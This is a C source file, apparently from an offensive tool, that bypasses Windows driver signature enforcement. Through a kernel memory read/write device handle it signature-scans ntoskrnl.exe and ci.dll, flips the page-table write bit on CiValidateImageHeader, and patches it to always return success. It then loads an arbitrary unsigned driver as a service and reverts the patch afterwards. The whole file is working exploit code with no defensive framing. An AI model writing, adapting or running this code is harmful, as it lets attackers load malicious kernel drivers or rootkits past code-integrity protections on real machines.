#include "dse.h"
#include "driver.h"
#include "kernel.h"
#include "pe.h"
#include "service.h"
#include <stdio.h>

BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
    BOOL result     = FALSE;
    BOOL pteFlipped = FALSE;
    BOOL patched    = FALSE;

    PVOID ciMap = MapFileIntoMemory("C:\\Windows\\System32\\ci.dll");
    printf("[*] ciMap (User-mode allocation): 0x%p\n", ciMap);
    PVOID kernelMap = MapFileIntoMemory("C:\\Windows\\System32\\ntoskrnl.exe");
    printf("[*] kernelMap (User-mode allocation): 0x%p\n", kernelMap);

    const char MiGetPteAddressSig[] = {
        0x48, 0xc1, 0xe9, 0x09, 0x48, 0xb8, 0xf8, 0xff, 0xff, 0xff,
        0x7f, 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8
    };
    const char CiValidateImageHeaderSig[] = {
        0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54,
        0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24,
        0x70, 0xff, 0xff, 0xff
    };

    DWORD64 kernelBase = GetKernelBaseAddress();
    DWORD64 ciBase     = GetCIBaseAddress();
    printf("[*] Real Kernel Base (ntoskrnl.exe): 0x%I64X\n", kernelBase);
    printf("[*] Real CI Base (CI.dll):            0x%I64X\n", ciBase);

    ULONG_PTR gadgetSearch = SearchSignatureInSection(
        (char*)".text", (char*)kernelMap,
        (char*)MiGetPteAddressSig, sizeof(MiGetPteAddressSig));
    if (!gadgetSearch) {
        printf("[-] MiGetPteAddress signature not found\n");
        goto cleanup;
    }
    ULONG_PTR MiGetPteAddress       = gadgetSearch - (ULONG_PTR)kernelMap + kernelBase;
    ULONG_PTR targetConstantAddress = MiGetPteAddress + sizeof(MiGetPteAddressSig);
    printf("[+] MiGetPteAddress:       0x%p\n", (void*)MiGetPteAddress);
    printf("[+] targetConstantAddress: 0x%p\n", (void*)targetConstantAddress);

    gadgetSearch = SearchSignatureInSection(
        (char*)"PAGE", (char*)ciMap,
        (char*)CiValidateImageHeaderSig, sizeof(CiValidateImageHeaderSig));
    if (!gadgetSearch) {
        printf("[-] CiValidateImageHeader signature not found\n");
        goto cleanup;
    }
    ULONG_PTR CiValidateImageHeader = gadgetSearch - (ULONG_PTR)ciMap + ciBase;
    printf("[+] CiValidateImageHeader (kernel): 0x%p\n", (void*)CiValidateImageHeader);

    ULONG_PTR pteBase    = ReadMemoryDWORD64(device, targetConstantAddress);
    printf("[+] PTE base:                        0x%p\n", (void*)pteBase);
    ULONG_PTR pteAddress = getPTEForVA(pteBase, CiValidateImageHeader);
    printf("[+] PTE address for CiValidateImageHeader: 0x%p\n", (void*)pteAddress);

    ULONG_PTR currentPteValue  = ReadMemoryDWORD64(device, pteAddress);
    printf("[+] Current PTE value:               0x%016I64X\n", (DWORD64)currentPteValue);
    ULONG_PTR writablePteValue = currentPteValue | 2;
    if (!WriteMemory(device, pteAddress, &writablePteValue, sizeof(writablePteValue))) {
        printf("[-] Failed to flip PTE write bit: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] PTE write bit set:               0x%016I64X -> 0x%016I64X\n",
           (DWORD64)currentPteValue, (DWORD64)writablePteValue);
    pteFlipped = TRUE;

    char      retShell[] = { 0x48, 0x31, 0xc0, 0xc3 };
    ULONG_PTR origMem    = ReadMemoryDWORD64(device, CiValidateImageHeader);
    printf("[+] CiValidateImageHeader original bytes: 0x%016I64X\n", (DWORD64)origMem);
    printf("[*] Writing patch (xor rax,rax; ret) to CiValidateImageHeader...\n");
    if (!WriteMemory(device, CiValidateImageHeader, retShell, sizeof(retShell))) {
        printf("[-] Failed to write patch to CiValidateImageHeader: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Patch written successfully.\n");
    patched = TRUE;

    if (!LoadDriver(driverPath, serviceName)) {
        printf("[-] Failed to load driver: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Started %s service.\n", serviceName);
    result = TRUE;

cleanup:
    if (patched) {
        printf("[*] Reverting CiValidateImageHeader to original bytes...\n");
        if (!WriteMemory(device, CiValidateImageHeader, &origMem, sizeof(origMem)))
            printf("[-] Failed to revert CiValidateImageHeader: %lu\n", GetLastError());
        else
            printf("[+] CiValidateImageHeader reverted.\n");
    }

    if (pteFlipped) {
        printf("[*] Reverting PTE write bit...\n");
        if (!WriteMemory(device, pteAddress, &currentPteValue, sizeof(currentPteValue)))
            printf("[-] Failed to revert PTE: %lu\n", GetLastError());
        else
            printf("[+] PTE reverted to 0x%016I64X\n", (DWORD64)currentPteValue);
    }

    return result;
}
